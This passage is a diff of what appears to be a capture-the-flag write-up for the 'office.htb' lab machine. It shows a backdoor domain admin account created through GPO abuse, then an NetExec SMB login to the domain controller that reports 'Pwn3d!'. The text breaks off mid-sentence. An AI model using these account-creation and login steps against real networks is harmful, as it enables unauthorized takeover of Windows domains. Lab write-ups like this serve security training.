@@ -984,4 +984,11 @@ User Policy update has completed successfully.
 ```
 Now i should have a backdoor admin account created for me with the creds `john:H4x00r123..`
 
-I 
+I could also specify a command when i ran pygpoabuse but leaving one out will create a backdoor account with these creds, so ill just do that!
+
+```python
+nxc smb dc.office.htb -u john -p 'H4x00r123..'            
+SMB         10.129.32.165   445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:None)
+SMB         10.129.32.165   445    DC               [+] office.htb\john:H4x00r123.. (Pwn3d!)
+```
+This user has a pwned indicatoed which tells me this 
